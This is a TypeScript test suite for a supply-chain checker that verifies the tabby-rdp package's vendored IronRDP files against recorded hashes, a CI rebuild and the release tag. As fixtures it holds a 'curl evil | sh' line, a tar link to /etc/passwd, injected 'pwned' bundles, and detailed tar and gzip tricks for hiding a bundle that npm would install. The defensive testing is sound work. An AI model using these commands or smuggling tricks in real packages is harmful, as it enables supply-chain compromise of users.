// vendor/ is IronRDP's web client and its WebAssembly as scripts/build-ironrdp.sh built them, from ironrdp/BASE_COMMIT
// with the patch series applied. The build records both sides in vendor/SHA256SUMS: a vendor/ file changed any other
// way, or a series changed without a rebuild, fails here. Whether the files are what those sources build to is for
// CI's rebuild (.github/workflows/ironrdp.yml), and whether a release holds them for the publish job; both run
// scripts/check-vendor.mjs, as the rest of this file does, against made-up repositories and packages. Needs git,
// nothing built: npm run test:unit
import { after, test } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync, spawnSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { gunzipSync, gzipSync } from 'node:zlib'
import { MANIFEST, checkBase, checkPackage, checkTree, compareRebuilt, sha256 } from '../../scripts/check-vendor.mjs'

const root = fileURLToPath(new URL('../../', import.meta.url))

test('vendor/SHA256SUMS lists the base commit, each patch and each file in vendor/', () => {
    const { unlisted, missing, odd } = checkTree(root)
    assert.deepEqual({ unlisted, missing, odd }, { unlisted: [], missing: [], odd: [] },
        'vendor/ was built from other patches, or changed by hand: npm run build:ironrdp rebuilds it')
})

test('vendor/ and the series are what vendor/SHA256SUMS records', () => {
    assert.deepEqual(checkTree(root).changed, [], 'changed since vendor/ was built: npm run build:ironrdp rebuilds it')
})

const scratch = fs.mkdtempSync(path.join(os.tmpdir(), 'trd-vendor-'))
after(() => fs.rmSync(scratch, { recursive: true, force: true }))
let made = 0
const fresh = (name: string) => path.join(scratch, `${name}-${++made}`)

/** git without this machine's configuration, so that commits work anywhere (no signing, any identity). */
function git (cwd: string, ...args: string[]): string {
    return execFileSync('git', ['-c', 'user.name=test', '-c', 'user.email=test@example.invalid', '-c', 'commit.gpgsign=false',
        '-c', 'init.defaultBranch=main', ...args], {
        cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' },
    })
}

type Files = Record<string, string | Buffer | { link: string }>

/** What a build makes from a base commit and two patches. The WebAssembly has line feeds in it, as the real one does. */
const BUILD: Record<string, string | Buffer> = {
    'ironrdp/BASE_COMMIT': '9b151c4c2e47c6014e1e8e55909d4180aa8bdb99\n',
    'ironrdp/patches/0001-fix-one-thing.patch': 'From 0000000000000000000000000000000000000000\nSubject: one\n',
    'ironrdp/patches/0002-fix-another.patch': 'From 0000000000000000000000000000000000000000\nSubject: another\n',
    'vendor/IRONRDP-LICENSE': 'MIT License\n',
    'vendor/iron-remote-desktop.js': 'export const one = 1\nexport const two = 2\n',
    'vendor/ironrdp_web_bg.wasm': Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x0a, 0x01, 0x0a, 0x0d, 0x0a]),
}

/** vendor/SHA256SUMS for those files as the build writes it: comments saying how it was built, then a line each. */
function list (files: Record<string, string | Buffer>, node = 'v26.8.2'): string {
    return [
        `# vendor/ is IronRDP ${String(files['ironrdp/BASE_COMMIT']).trim()} with the patches below, built by scripts/build-ironrdp.sh with`,
        `# rustc 1.94.1, wasm-pack 0.15.0 and Node.js ${node}, on aarch64-apple-darwin.`,
        ...Object.keys(files).sort().map(file => `${sha256(Buffer.from(files[file]))}  ${file}`),
    ].join('\n') + '\n'
}

/** Writes files into a folder: their contents, or a link. */
function write (dir: string, files: Files): string {
    for (const [file, content] of Object.entries(files)) {
        fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true })
        if (typeof content === 'object' && 'link' in content) {
            fs.symlinkSync(content.link, path.join(dir, file))
        } else {
            fs.writeFileSync(path.join(dir, file), content)
        }
    }
    return dir
}

/** A checkout with a build's files and its list, and anything else given. */
const checkout = (files = BUILD, more: Files = {}) => write(fresh('checkout'), { ...files, [MANIFEST]: list(files), ...more })

/** The same, committed. */
function repository (files = BUILD, more: Files = {}): string {
    const dir = checkout(files, more)
    git(dir, 'init', '-q')
    git(dir, 'add', '-A')
    git(dir, 'commit', '-q', '-m', 'vendor/ built')
    return dir
}

/** CI's rebuild in a repository: vendor/ emptied, then what the build made this time, with its list. */
function rebuild (dir: string, files = BUILD, node = 'v22.22.2', more: Files = {}): void {
    fs.rmSync(path.join(dir, 'vendor'), { recursive: true, force: true })
    write(dir, { ...Object.fromEntries(Object.entries(files).filter(([file]) => file.startsWith('vendor/'))), [MANIFEST]: list(files, node), ...more })
}

test('a file in vendor/ that the build did not make fails the list check, hidden or not, whatever its name', () => {
    for (const name of ['extra.js', 'extra file.js', 'extrá.js', 'sub dir/x.js', 'iron*', '.extra blob', '.npmignore']) {
        assert.deepEqual(checkTree(checkout(BUILD, { [`vendor/${name}`]: 'globalThis.pwned = 1\n' })).unlisted, [`vendor/${name}`], name)
    }
    // Finder's folder settings: npm never packs them.
    assert.deepEqual(checkTree(checkout(BUILD, { 'vendor/.DS_Store': 'Bud1' })).unlisted, [])
})

test('a link in vendor/ fails the list check, even to the right bytes', () => {
    const elsewhere = write(fresh('elsewhere'), { 'module.wasm': BUILD['vendor/ironrdp_web_bg.wasm'] })
    const dir = checkout()
    fs.rmSync(path.join(dir, 'vendor/ironrdp_web_bg.wasm'))
    write(dir, { 'vendor/ironrdp_web_bg.wasm': { link: path.join(elsewhere, 'module.wasm') } })
    const result = checkTree(dir)
    assert.deepEqual([result.odd, result.missing], [['vendor/ironrdp_web_bg.wasm'], ['vendor/ironrdp_web_bg.wasm']])
})

test('only text files may differ from the list by their line ends (a Windows checkout), not the WebAssembly', () => {
    const crlf = (text: string | Buffer) => String(text).replaceAll('\n', '\r\n')
    const windows = checkout(BUILD, {
        'vendor/iron-remote-desktop.js': crlf(BUILD['vendor/iron-remote-desktop.js']),
        'ironrdp/patches/0001-fix-one-thing.patch': crlf(BUILD['ironrdp/patches/0001-fix-one-thing.patch']),
        [MANIFEST]: crlf(list(BUILD)),
    })
    assert.deepEqual(checkTree(windows), { unlisted: [], missing: [], changed: [], odd: [] })

    const wasm = BUILD['vendor/ironrdp_web_bg.wasm'] as Buffer
    const withCr = Buffer.from(wasm.toString('latin1').replaceAll('\n', '\r\n'), 'latin1')
    assert.notEqual(withCr.length, wasm.length)
    assert.deepEqual(checkTree(checkout(BUILD, { 'vendor/ironrdp_web_bg.wasm': withCr })).changed, ['vendor/ironrdp_web_bg.wasm'])
})

test("CI's rebuild comparison passes a rebuild that matches, whatever Node.js the list's comments name", () => {
    const dir = repository()
    rebuild(dir, BUILD, 'v22.22.2')
    const result = compareRebuilt(dir)
    assert.deepEqual(result.listDifferences, [])
    assert.equal(result.same, true)
    assert.deepEqual(result.files.map(file => [file.file, file.same]),
        [['vendor/IRONRDP-LICENSE', true], ['vendor/iron-remote-desktop.js', true], ['vendor/ironrdp_web_bg.wasm', true]])
})

test("CI's rebuild comparison catches a committed file the build doesn't make, whatever its name", () => {
    for (const name of ['extra.js', 'extra file.js', 'extrá.js', 'sub dir/x.js', 'iron*', '.extra blob']) {
        const dir = repository(BUILD, { [`vendor/${name}`]: 'globalThis.pwned = 1\n' })
        rebuild(dir)
        const result = compareRebuilt(dir)
        assert.equal(result.same, false, name)
        assert.deepEqual(result.files.filter(file => !file.same).map(file => [file.file, file.rebuilt]), [[`vendor/${name}`, null]], name)
    }
})

test("CI's rebuild comparison catches a changed, missing or extra rebuilt file, and lists that differ", () => {
    const changed = { ...BUILD, 'vendor/ironrdp_web_bg.wasm': Buffer.from('\0asm\x01\0\0\0 other') }
    let dir = repository()
    rebuild(dir, changed)
    let result = compareRebuilt(dir)
    assert.deepEqual(result.files.filter(file => !file.same).map(file => file.file), ['vendor/ironrdp_web_bg.wasm'])
    assert.equal(result.listDifferences.length, 1)

    dir = repository()
    rebuild(dir)
    fs.rmSync(path.join(dir, 'vendor/iron-remote-desktop.js'))
    result = compareRebuilt(dir)
    assert.deepEqual(result.files.filter(file => !file.same).map(file => [file.file, file.rebuilt]), [['vendor/iron-remote-desktop.js', null]])

    dir = repository()
    rebuild(dir, BUILD, 'v22.22.2', { 'vendor/.extra': 'x' })
    assert.deepEqual(compareRebuilt(dir).files.filter(file => !file.same).map(file => [file.file, file.committed]), [['vendor/.extra', null]])

    // Finder's folder settings in the rebuilt folder aren't the build's, but a committed one is a difference.
    dir = repository()
    rebuild(dir, BUILD, 'v22.22.2', { 'vendor/.DS_Store': 'Bud1' })
    assert.equal(compareRebuilt(dir).same, true)
    dir = repository(BUILD, { 'vendor/.DS_Store': 'Bud1' })
    rebuild(dir)
    assert.deepEqual(compareRebuilt(dir).files.filter(file => !file.same).map(file => [file.file, file.rebuilt]), [['vendor/.DS_Store', null]])

    // The commit's list names other patches than the rebuild's: the files match, the series doesn't.
    dir = repository()
    rebuild(dir, { ...BUILD, 'ironrdp/patches/0002-fix-another.patch': 'Subject: changed\n' })
    result = compareRebuilt(dir)
    assert.equal(result.same, false)
    assert.match(result.listDifferences.join('\n'), /^ironrdp\/patches\/0002-fix-another\.patch: committed [0-9a-f]{64}, rebuilt [0-9a-f]{64}$/)
})

test("CI's rebuild comparison refuses a link in vendor/, committed or rebuilt", () => {
    let dir = repository(BUILD, { 'vendor/iron-remote-desktop-rdp.js': { link: 'iron-remote-desktop.js' } })
    rebuild(dir)
    let result = compareRebuilt(dir)
    assert.equal(result.same, false)
    assert.deepEqual(result.odd, ['vendor/iron-remote-desktop-rdp.js (committed, git mode 120000)'])

    dir = repository()
    rebuild(dir, BUILD, 'v22.22.2', { 'vendor/linked.js': { link: 'iron-remote-desktop.js' } })
    result = compareRebuilt(dir)
    assert.equal(result.same, false)
    assert.deepEqual(result.odd, ['vendor/linked.js (rebuilt, not a file)'])
})

type Entry = { path: string, data?: string | Buffer, type?: string, link?: string, prefix?: string, magic?: string }

/** A gzipped tar of the entries, as npm pack writes one (ustar headers), then its end: two empty blocks, or `end`. A
 * type of 2 is a link, 5 a folder; a prefix is the folder part of a long name, which ustar keeps apart. Entries in more
 * come after a single empty block, where npm's tar reader reads on. */
function tarball (entries: Entry[], more: Entry[] = [], end = Buffer.alloc(1024)): string {
    const blocks: Buffer[] = []
    const add = ({ path: name, data = '', type = '0', link = '', prefix = '', magic = 'ustar\u000000' }: Entry) => {
        const body = Buffer.from(data)
        const header = Buffer.alloc(512)
        header.write(name, 0, 100, 'utf8')
        header.write('0000644\0', 100, 'latin1')
        header.write('0000000\0', 108, 'latin1')
        header.write('0000000\0', 116, 'latin1')
        header.write(`${body.length.toString(8).padStart(11, '0')}\0`, 124, 'latin1')
        header.write('14657232400\0', 136, 'latin1')
        header.write(type, 156, 'latin1')
        header.write(link, 157, 100, 'utf8')
        header.write(magic, 257, 8, 'latin1')
        header.write(prefix, 345, 155, 'utf8')
        header.fill(0x20, 148, 156)
        header.write(`${header.reduce((sum, byte) => sum + byte, 0).toString(8).padStart(6, '0')}\0 `, 148, 'latin1')
        blocks.push(header, body, Buffer.alloc((512 - body.length % 512) % 512))
    }
    entries.forEach(add)
    if (more.length > 0) {
        blocks.push(Buffer.alloc(512))
        more.forEach(add)
    }
    blocks.push(end)
    const file = `${fresh('package')}.tgz`
    fs.writeFileSync(file, gzipSync(Buffer.concat(blocks)))
    return file
}

/** The repository's package: what npm packs from it (vendor/, package.json, the README) and a built dist/. */
const PACKAGE: Record<string, string | Buffer> = {
    'package.json': '{\n  "name": "tabby-rdp",\n  "version": "1.2.3"\n}\n',
    'README.md': '# tabby-rdp\n',
}
const DIST = { 'dist/index.js': 'exports.ok = true\n' }
const packaged = (files = BUILD) => [
    ...Object.entries(files).filter(([file]) => file.startsWith('vendor/')),
    [MANIFEST, list(files)] as const,
    ...Object.entries(PACKAGE),
]
const entries = (files: (readonly [string, string | Buffer])[]): Entry[] => files.map(([file, data]) => ({ path: `package/${file}`, data }))

/** A repository with the package's files, tagged with its version. */
function released (): string {
    const dir = repository(BUILD, PACKAGE)
    git(dir, 'tag', 'v1.2.3')
    return dir
}

test("the publish check passes the tagged commit's package, finding the tag by the package's version", () => {
    const dir = released()
    const result = checkPackage(dir, tarball(entries([...packaged(), ...Object.entries(DIST)])))
    assert.deepEqual(result.problems, [])
    assert.deepEqual([result.revision, result.version, result.vendor, result.built], ['v1.2.3', '1.2.3', 3, 1])
})

test("the publish check reads the tag's list, not the package's: a changed file and its line in the package's list fail", () => {
    const dir = released()
    const tampered = { ...BUILD, 'vendor/ironrdp_web_bg.wasm': Buffer.from('\0asm\x01\0\0\0 backdoor') }
    // The package's own list vouches for the changed file: `shasum -c vendor/SHA256SUMS` in it would pass.
    const files = packaged(tampered)
    const own = String(files.find(([file]) => file === MANIFEST)?.[1])
    assert.ok(own.includes(sha256(tampered['vendor/ironrdp_web_bg.wasm'])))
    const result = checkPackage(dir, tarball(entries(files)))
    assert.deepEqual(result.problems, [
        'vendor/ironrdp_web_bg.wasm: not as in v1.2.3',
        'vendor/SHA256SUMS: not as in v1.2.3',
        "vendor/ironrdp_web_bg.wasm: not what v1.2.3's vendor/SHA256SUMS records",
    ])
})

test('the publish check fails a package missing a vendor/ file, or with one the list does not have', () => {
    const dir = released()
    const files = packaged().filter(([file]) => file !== 'vendor/iron-remote-desktop.js')
    assert.deepEqual(checkPackage(dir, tarball(entries(files))).problems, ['vendor/iron-remote-desktop.js: missing from the package'])

    const extra = checkPackage(dir, tarball(entries([...packaged(), ['vendor/.extra blob', 'globalThis.pwned = 1\n']]))).problems
    assert.deepEqual(extra, ['vendor/.extra blob: not a file in v1.2.3', "vendor/.extra blob: not in v1.2.3's vendor/SHA256SUMS"])
})

test('the publish check fails a file outside dist/ that the tag does not have, or has otherwise', () => {
    const dir = released()
    assert.deepEqual(checkPackage(dir, tarball(entries([...packaged(), ['remote/helper.sh', 'curl evil | sh\n']]))).problems,
        ['remote/helper.sh: not a file in v1.2.3'])
    const changed = packaged().map(([file, data]) => [file, file === 'README.md' ? '# tabby-rdp, changed\n' : data] as const)
    assert.deepEqual(checkPackage(dir, tarball(entries(changed))).problems, ['README.md: not as in v1.2.3'])
})

test("dist/ is built, so only another build's package can vouch for it (--same-as)", () => {
    const dir = released()
    const staged = tarball(entries([...packaged(), ['dist/index.js', 'exports.ok = "backdoor"\n']]))
    assert.deepEqual(checkPackage(dir, staged).problems, [])
    const local = tarball(entries([...packaged(), ...Object.entries(DIST)]))
    assert.deepEqual(checkPackage(dir, staged, { sameAs: local }).problems, [`dist/index.js: not as in ${local}`])
    assert.deepEqual(checkPackage(dir, local, { sameAs: local }).problems, [])
})

test('the publish check fails links, a name twice, names outside the package folder and names one in two cases', () => {
    const dir = released()
    const good = entries(packaged())
    const problems = (more: Entry[]) => checkPackage(dir, tarball([...good, ...more]), { revision: 'v1.2.3' }).problems.map(p => p.replace(/ in \S+\.tgz/, ''))
    assert.deepEqual(problems([{ path: 'package/dist/link.js', type: '2', link: '/etc/passwd' }]), ['dist/link.js: not a plain file (tar type 2)'])
    assert.deepEqual(problems([{ path: 'package/README.md', data: '# changed\n' }]), ['README.md: in it twice', 'README.md: not as in v1.2.3'])
    assert.deepEqual(problems([{ path: 'other/vendor/x.js', data: 'x' }]), ['other/vendor/x.js: not a file in the package\'s folder'])
    assert.deepEqual(problems([{ path: 'package/../x.js', data: 'x' }]), ['package/../x.js: not a file in the package\'s folder'])
    assert.deepEqual(problems([{ path: 'package/dist/Index.js', data: 'x' }, { path: 'package/dist/index.js', data: 'y' }]),
        ['dist/index.js and dist/Index.js: one file on a disk that ignores case'])
})

test('the publish check fails a folder entry, where a required file is or anywhere: an extractor makes a folder at its path', () => {
    // npm pack writes files only, and the check read a folder entry as nothing: an extractor makes the folder all the
    // same, at the path of a file the package has (a required one, say), or at one it hasn't.
    const dir = released()
    const good = entries([...packaged(), ...Object.entries(DIST)])
    const problems = (file: string, sameAs?: string) => checkPackage(dir, file, { revision: 'v1.2.3', ...sameAs ? { sameAs } : {} }).problems.map(p => p.replace(/ in \S+\.tgz/, ''))
    const folder = (path: string): Entry => ({ path, type: '5' })
    const wasm = 'package/vendor/ironrdp_web_bg.wasm'
    const withFolder = (...more: Entry[]) => tarball([...good, ...more])
    const message = (path: string) => `${path}: a folder, which npm pack doesn't write and an extractor makes at that path`
    assert.deepEqual(problems(withFolder(folder(wasm))), [message(wasm)])
    assert.deepEqual(problems(withFolder(folder(`${wasm}/`))), [message(`${wasm}/`)])
    // Ahead of the file, at a file of another place, or a folder of its own.
    assert.deepEqual(problems(tarball([folder(wasm), ...good])), [message(wasm)])
    assert.deepEqual(problems(withFolder(folder('package/dist/'), folder('package/'))), [message('package/dist/'), message('package/')])
    // Against another package (--same-as): the one checked, or the one it is compared with.
    const clean = tarball(good)
    assert.deepEqual(problems(clean, clean), [])
    assert.deepEqual(problems(withFolder(folder(wasm)), clean), [message(wasm)])
    assert.deepEqual(problems(clean, withFolder(folder(wasm))), [message(wasm)])
})

test('the publish check fails a package with more after its end, which npm would install unchecked', () => {
    // npm's tar reader (node-tar) takes a single empty block for a gap and reads on: a check that stopped there would
    // pass this package, and npm would install the bundle that follows over the one checked.
    const dir = released()
    const hidden = tarball(entries(packaged()), [{ path: 'package/vendor/iron-remote-desktop.js', data: 'globalThis.pwned = 1\n' }])
    assert.throws(() => checkPackage(dir, hidden), /more after the end of the archive \(byte \d+\), which npm would unpack too/)
})

test('the publish check fails a package with more after its gzip member, which npm would unpack too', () => {
    // Node's gunzip reads one member and stops at a zero byte after it; npm's reader (node-tar, fed the package in
    // pieces as it comes) starts again at the next piece, and unpacks a member there. The first member here is the
    // package without its end, then come zeros to a 64 KB boundary, then a member with another bundle: gunzip shows
    // the package as it should be, and npm would install the other bundle in its place.
    const dir = released()
    const unpacked = (file: string) => gunzipSync(fs.readFileSync(file))
    const good = unpacked(tarball(entries([...packaged(), ...Object.entries(DIST)])))
    // Its end is two empty blocks.
    const open = good.subarray(0, good.length - 1024)
    const other = unpacked(tarball([{ path: 'package/vendor/iron-remote-desktop.js', data: 'globalThis.pwned = 1\n' }]))
    const file = (...parts: Buffer[]) => {
        const name = `${fresh('gzip')}.tgz`
        fs.writeFileSync(name, Buffer.concat(parts))
        return name
    }
    const first = gzipSync(open)
    const piece = 64 * 1024
    const hidden = file(first, Buffer.alloc(piece - first.length % piece), gzipSync(other))
    // gunzip alone, as the check read a package before: the package as it should be, and nothing of the bundle after it.
    assert.deepEqual(unpacked(hidden), open)
    assert.throws(() => checkPackage(dir, hidden), /: \d+ bytes after its gzip member, which npm pack doesn't write and npm's reader can unpack$/)
    // Nor anything else after the member: zeros, or a second member right after it.
    assert.throws(() => checkPackage(dir, file(gzipSync(good), Buffer.alloc(512))), /: 512 bytes after its gzip member/)
    assert.throws(() => checkPackage(dir, file(first, gzipSync(other))), /bytes after its gzip member/)
    // A header with more in it than npm pack writes (a file name): only the plain one is read.
    const named = gzipSync(good)
    named[3] = 0x08
    assert.throws(() => checkPackage(dir, file(named.subarray(0, 10), Buffer.from('package.tar\0'), named.subarray(10))), /: not gzip as npm pack writes it/)
    // A member that fails its check, or is cut short, fails as before.
    const damaged = gzipSync(good)
    damaged[damaged.length - 8] ^= 1
    assert.throws(() => checkPackage(dir, file(damaged)), /: incorrect data check$/)
    assert.throws(() => checkPackage(dir, file(gzipSync(good).subarray(0, -4))), /: unexpected end of file$/)
    // The one member npm pack writes, and nothing after it, passes.
    assert.deepEqual(checkPackage(dir, file(gzipSync(good))).problems, [])
})

/** A pax record as tar writes it, its own length first. */
function record (key: string, value: string): string {
    const rest = ` ${key}=${value}\n`
    let length = rest.length + 1
    while (`${length}${rest}`.length !== length) {
        length++
    }
    return `${length}${rest}`
}

test('the publish check reads a long name as npm pack writes one: a ustar prefix, or a pax header ahead', () => {
    const dir = released()
    const long = (to: (entry: Entry) => Entry[]) => entries(packaged()).flatMap(entry => entry.path === 'package/vendor/iron-remote-desktop.js' ? to(entry) : [entry])
    assert.deepEqual(checkPackage(dir, tarball(long(entry => [{ ...entry, path: 'iron-remote-desktop.js', prefix: 'package/vendor' }]))).problems, [])
    const pax = { path: 'PaxHeader/iron-remote-desktop.js', type: 'x', data: record('path', 'package/vendor/iron-remote-desktop.js') + record('mtime', '499162500') }
    assert.deepEqual(checkPackage(dir, tarball(long(entry => [pax, { ...entry, path: 'iron-remote-desktop.js' }]))).problems, [])
})

test('the publish check fails a tarball npm would read otherwise, rather than check other files than npm installs', () => {
    // node-tar, npm's tar reader, skips a header it finds wrong (a file with a link target) and reads that entry's data
    // as the next headers, and takes a folder's data, or a file's whose name ends in a slash, for none: from the first
    // three of these tarballs it would install a bundle that a reader stepping over the data never sees. The others
    // are tar that npm pack doesn't write either, which readers read in different ways.
    const dir = released()
    // The data each of them carries: a header and the changed bundle, which node-tar would read as an entry.
    const body = gunzipSync(fs.readFileSync(tarball([{ path: 'package/vendor/iron-remote-desktop.js', data: 'globalThis.pwned = 1\n' }]))).subarray(0, 1024)
    const hidden = (entry: Entry) => tarball([...entries(packaged()), entry])
    const cases: [Entry, RegExp][] = [
        [{ path: 'package/dist/a.js', link: 'b.js', data: body }, /names a link target for what is no link/],
        [{ path: 'package/dist/', type: '5', data: body }, /is a folder with data/],
        [{ path: 'package/dist/a.js/', data: body }, /is a file whose name ends in a slash/],
        [{ path: 'package/dist/a.js\0x', data: body }, /has more in a field \(byte 0\) after its end/],
        [{ path: 'package/dist/a.js', magic: 'ustar  \0', data: body }, /hasn't ustar's magic and version/],
        [{ path: '././@LongLink', type: 'L', data: 'package/dist/a.js\0' }, /is of a kind that isn't a file, a folder or a link \(tar type L\)/],
    ]
    for (const [entry, error] of cases) {
        assert.throws(() => checkPackage(dir, hidden(entry)), error, entry.path)
    }
    const pax = (...records: string[]): Entry => ({ path: 'PaxHeader/a.js', type: 'x', data: records.join('') })
    const paxCases: [Entry[], RegExp][] = [
        [[pax(record('path', 'dist/a.js')), { path: 'a.js', prefix: 'package', data: body }], /has a ustar prefix besides a pax name/],
        [[pax(record('path', 'package/dist/a.js'), record('linkpath', 'x')), { path: 'a.js', data: body }], /has a pax record npm pack doesn't write \(linkpath\)/],
        [[pax(record('path', 'package/dist/a.js'), record('type', '5')), { path: 'a.js', data: body }], /has a pax record npm pack doesn't write \(type\)/],
        [[pax(record('path', 'package/dist/a.js')), pax(record('path', 'package/dist/b.js')), { path: 'a.js', data: body }], /is a second pax header in a row/],
        [[pax(`99 path=package/dist/a.js\n`), { path: 'a.js', data: body }], /has a pax record that is not one/],
        // A name that ends in a slash in the ustar header, which the pax name leaves off: a folder to node-tar too.
        [[pax(record('path', 'package/dist/a.js')), { path: 'package/dist/a.js/', data: body }], /is a file whose name ends in a slash/],
        // A pax header with no entry after it.
        [[pax(record('path', 'package/dist/a.js'))], /a pax header with no entry after it/],
    ]
    for (const [more, error] of paxCases) {
        assert.throws(() => checkPackage(dir, tarball([...entries(packaged()), ...more])), error)
    }
    // An archive that doesn't end in empty blocks: out of data right after an entry, or with a part of a block (zeros
    // or not) where the next header would be, which a reader reading blocks never sees.
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(0))), /no empty blocks at its end/)
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.from('a part of a header'))), /18 bytes after its last entry, less than a block/)
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(100))), /100 bytes after its last entry, less than a block/)
    // Less than an empty block is no end either.
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(511))), /511 bytes after its last entry, less than a block/)
    // One empty block alone, or whole ones and a part of one more: not the end npm pack writes either.
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(512))), /its end is 512 bytes of zeros/)
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(1124))), /its end is 1124 bytes of zeros/)
    // The end as npm pack writes it passes, and so does one with more empty blocks after it (it pads to a record).
    assert.deepEqual(checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(10240))).problems, [])
})

/** The script run as the workflows run it, from a copy in a made-up repository (it checks the repository it is in): its
 * exit code, what it printed, and what it added to the run's summary. */
function command (dir: string, ...args: string[]): { status: number | null, output: string, summary: string } {
    fs.mkdirSync(path.join(dir, 'scripts'), { recursive: true })
    fs.copyFileSync(path.join(root, 'scripts/check-vendor.mjs'), path.join(dir, 'scripts/check-vendor.mjs'))
    const summary = `${fresh('summary')}.md`
    fs.writeFileSync(summary, '')
    // Without GITHUB_ACTIONS, errors come as plain lines rather than as annotations for the run around the tests.
    const env: NodeJS.ProcessEnv = { ...process.env, GITHUB_STEP_SUMMARY: summary }
    delete env.GITHUB_ACTIONS
    const run = spawnSync(process.execPath, [path.join(dir, 'scripts/check-vendor.mjs'), ...args], { cwd: dir, encoding: 'utf8', env })
    return { status: run.status, output: run.stdout + run.stderr, summary: fs.readFileSync(summary, 'utf8') }
}

test("CI's rebuild comparison as a command: exit 0 for the same files, 1 for a file the build doesn't make, both in the summary", () => {
    let dir = repository()
    rebuild(dir)
    let run = command(dir, 'rebuilt')
    assert.equal(run.status, 0, run.output)
    assert.match(run.output, /^vendor\/ is byte for byte what the series builds to\.$/m)
    assert.match(run.summary, /^\| `vendor\/ironrdp_web_bg\.wasm` \| `[0-9a-f]{64}` \| `[0-9a-f]{64}` \| same \|$/m)

    dir = repository(BUILD, { 'vendor/.extra blob': 'globalThis.pwned = 1\n' })
    rebuild(dir)
    run = command(dir, 'rebuilt')
    assert.equal(run.status, 1, run.output)
    assert.match(run.output, /^vendor\/\.extra blob: DIFFERENT\n {2}committed [0-9a-f]{64}\n {2}rebuilt {3}none$/m)
    assert.match(run.summary, /^\| `vendor\/\.extra blob` \| `[0-9a-f]{64}` \| `none` \| DIFFERENT \|$/m)
    assert.match(run.output, /^vendor\/ is not what IronRDP and ironrdp\/patches build to here\./m)
})

test("the publish check as a command: exit 0 for the tagged commit's package, 1 for another, and no options of git's", () => {
    const dir = released()
    let run = command(dir, 'package', tarball(entries([...packaged(), ...Object.entries(DIST)])))
    assert.equal(run.status, 0, run.output)

    run = command(dir, 'package', tarball(entries(packaged({ ...BUILD, 'vendor/iron-remote-desktop.js': 'globalThis.pwned = 1\n' }))))
    assert.equal(run.status, 1, run.output)
    assert.match(run.output, /^ {2}vendor\/iron-remote-desktop\.js: not what v1\.2\.3's vendor\/SHA256SUMS records$/m)

    // As a revision, git would read it as an option.
    run = command(dir, 'package', tarball(entries(packaged())), '--ignore-missing')
    assert.equal(run.status, 1, run.output)
    assert.match(run.output, /^usage: /m)
})

test('the publish check needs the tag in the repository', () => {
    const dir = repository(BUILD, PACKAGE)
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()))), /v1\.2\.3 is not in this repository/)
})

test("the base commit has to be in IronRDP's history, not just fetchable through its address (a fork's)", () => {
    // IronRDP, with a fork's commit fetchable through it, as GitHub serves forks' commits.
    const upstream = fresh('upstream')
    fs.mkdirSync(upstream)
    git(upstream, 'init', '-q')
    const commit = (message: string) => {
        git(upstream, 'commit', '-q', '--allow-empty', '-m', message)
        return git(upstream, 'rev-parse', 'HEAD').trim()
    }
    const first = commit('one')
    const second = commit('two')
    git(upstream, 'branch', '-m', 'master')
    git(upstream, 'checkout', '-q', '-b', 'fork', first)
    const fork = commit('a fork')
    git(upstream, 'checkout', '-q', 'master')
    git(upstream, 'config', 'uploadpack.allowFilter', 'true')
    git(upstream, 'config', 'uploadpack.allowAnySHA1InWant', 'true')

    const base = (sha: string) => checkBase(write(fresh('base'), { 'ironrdp/BASE_COMMIT': `${sha}\n` }), { upstream: `file://${upstream}` }).upstream
    assert.equal(base(first), true)
    assert.equal(base(second), true)
    assert.equal(base(fork), false)
    assert.equal(base('0123456789abcdef0123456789abcdef01234567'), false)
    assert.throws(() => base('master'), /not a commit/)
    // No history, no answer: the build stops rather than go on unchecked.
    assert.throws(() => checkBase(write(fresh('base'), { 'ironrdp/BASE_COMMIT': `${first}\n` }), { upstream: `file://${upstream}-missing` }),
        /ironrdp\/BASE_COMMIT can't be checked: IronRDP's history \(file:\/\/.*-missing, master\) didn't come: /)
})
